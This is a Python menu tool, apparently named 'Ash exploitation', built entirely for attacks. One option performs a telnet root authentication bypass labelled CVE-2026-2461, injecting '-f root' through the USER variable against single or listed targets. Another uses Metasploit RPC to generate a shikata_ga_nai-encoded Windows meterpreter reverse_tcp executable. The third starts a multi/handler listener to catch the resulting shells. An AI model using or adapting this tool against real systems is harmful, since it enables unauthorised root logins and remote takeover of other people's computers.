from pymenu import Menu
import subprocess
import getpass
from pymetasploit3.msfrpc import MsfRpcClient

def CVE20262461():
    selector = input('[+] Single or multiple: ')
    if selector == 'single':
        target = input("[+] Telnet IP Address: ")
        subprocess.run([f'''USER='-f root' telnet -a {target}'''], shell=True)
    elif selector == 'multiple':
        target = open('targets.txt', 'r')
        targets = target.readlines()
        for line in targets:
            subprocess.run([f'''USER='-f root' telnet -a {line}'''], shell=True)
            print('\n')

def windowspayload():
    msfpass = getpass.getpass('[+] Enter your MSFRPCD password: ')
    print('\n[+] Starting MSFRPCD server...')
    subprocess.run(f'''msfrpcd -P {msfpass}''', shell=True)
    print('\n[+] MSFRPCD server started successfully!\n')
    IP = input("[+] Payload IP address: ")
    port = input("[+] Payload port: ")
    print('\n[+] Creating windows payload...')
    client = MsfRpcClient(msfpass, port=55552, ssl=True)
    payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
    payload['Encoder'] = 'x86/shikata_ga_nai'
    payload['iterations'] = '10'
    payload.runoptions['LHOST'] = IP
    payload.runoptions['LPORT'] = port
    payload['arch'] = 'x86'
    payload['platform'] = 'windows'
    payload['encryption'] = 'aes256'
    payload['Format'] = 'exe'
    data = payload.payload_generate()
    if isinstance(data, str):
        print(data)
    else:
        with open('payload.exe', 'wb') as f:
            f.write(data)
    print('\n[+] Payload created successfully!')

def windowslistener():
    msfpass = getpass.getpass('[+] Enter your MSFRPCD password: ')
    print('\n[+] Starting MSFRPCD server...')
    subprocess.run(f'''msfrpcd -P {msfpass}''', shell=True)
    print('\n[+] MSFRPCD server started successfully!')
    print('[+] Starting multi/handler...')
    client = MsfRpcClient(msfpass, port=55552)
    exploit = client.modules.use('exploit', 'multi/handler')
    winpayload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
    winpayload['LHOST'] = '172.28.128.1'
    winpayload['LPORT'] = 4444
    exploit.execute(payload=winpayload)

menu = Menu('''

    _    ____  _   _ 
   / \  / ___|| | | |
  / _ \ \___ \| |_| |
 / ___ \ ___) |  _  |
/_/   \_\____/|_| |_|

\nAsh exploitation, at your service''')
menu.add_option("[+] Exploit CVE-2026-2461 telnet root auth bypass", lambda: CVE20262461())
menu.add_option('[+] Create windows payload (MSFVenom)', lambda: windowspayload())
menu.add_option('[+] Listen for windows payload (MSFvenom)', lambda: windowslistener())
menu.show()